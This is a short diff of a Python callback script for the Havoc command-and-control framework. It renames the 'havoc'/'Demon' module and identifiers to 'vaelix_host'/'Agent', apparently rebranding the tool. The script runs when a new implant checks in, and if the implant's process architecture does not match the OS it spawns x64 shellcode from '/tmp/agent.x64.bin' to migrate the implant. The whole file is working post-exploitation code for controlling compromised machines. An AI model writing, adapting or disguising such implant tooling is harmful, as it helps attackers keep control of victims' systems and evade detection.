@@ -1,11 +1,11 @@
-from havoc import Demon, RegisterCallback
+from vaelix_host import Agent, RegisterCallback
 
-def new_demon( demonID ):
-    demon  : Demon  = None
-    demon  = Demon( demonID )
+def new_agent( agentID ):
+    agent  : Agent  = None
+    agent  = Agent( agentID )
 
-    if demon.OSArch.startswith(demon.ProcessArch) is False:
-        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"migrating to x64" )
-        demon.Command(TaskID, 'shellcode spawn x64 /tmp/demon.x64.bin')
+    if agent.OSArch.startswith(agent.ProcessArch) is False:
+        TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"migrating to x64" )
+        agent.Command(TaskID, 'shellcode spawn x64 /tmp/agent.x64.bin')
 
-RegisterCallback(new_demon)
+RegisterCallback(new_agent)
